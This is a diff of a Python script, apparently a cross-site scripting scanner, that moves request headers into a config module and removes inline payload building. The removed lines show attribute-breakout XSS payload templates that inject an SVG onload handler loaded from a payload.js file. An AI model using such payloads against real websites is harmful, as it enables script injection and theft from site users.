@@ -7,31 +7,9 @@ from random import choice
 
 from core.context import getContext
 from core.payload import genPayload
+from core.config import headers
 
 test = "6ix8uzz"
-headers = {
-    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'Accept-Language': 'en-US,en;q=0.5',
-    'Accept-Encoding': 'gzip',
-    'Connection': 'close',
-    'DNT': '1',
-    'Upgrade-Insecure-Requests': '1',
-}
-
-input_reg = '<input.*?name=[\'\"](.*?)[\'\"].*?>'
-
-# contexts where the test input can land in
-contexts = [
-    {
-        "name" : "quotes",
-        "match_str" : "<.*=\"({}\d*)\".*>|<.*=\'({}\d*)\'.*>".format(test, test)
-    }
-]
-
-payload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))
-single_quote_payload = "\'><svg onload=\'{}\'".format(payload)
-double_quote_payload = "\"><svg onload=\'{}\'".format(payload)
 
 if len(sys.argv) < 2:
     print("usage: python xss.py url")
@@ -40,6 +18,8 @@ if len(sys.argv) < 2:
 url = sys.argv[1]
 if "http://" not in url:
     url = "http://" + url
+
+input_reg = '<input.*?name=[\'\"](.*?)[\'\"].*?>'
 
 response = requests.get(url, headers=headers)
 
